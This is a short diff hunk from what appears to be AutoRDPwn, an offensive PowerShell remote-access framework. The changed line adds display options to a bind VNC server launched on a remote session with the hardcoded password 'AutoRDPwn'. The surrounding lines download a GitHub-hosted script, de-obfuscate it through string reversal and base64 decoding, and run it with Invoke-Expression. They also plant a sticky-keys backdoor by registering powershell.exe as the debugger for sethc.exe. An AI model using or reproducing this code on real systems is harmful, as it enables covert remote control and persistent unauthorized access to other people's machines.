@@ -567,7 +567,7 @@ function Remove-Exclusions {
     if($vncserver){ $base64 = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')
     invoke-command -session $RDP[0] -scriptblock { $base64array = ($using:base64).ToCharArray() ; [array]::Reverse($base64array) ; -join $base64array 2>&1> $null
     $base64string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64array"))
-    Invoke-Expression $base64string | Out-Null ; Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn }}
+    Invoke-Expression $base64string | Out-Null ; Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn -disablesponsor -nostatus -notoolbar -autoscaling -nocursor }}
         
     if ($sticky){ invoke-command -session $RDP[0] -scriptblock {
     New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value "powershell.exe -noexit ; clear" -PropertyType String -Force 2>&1> $null
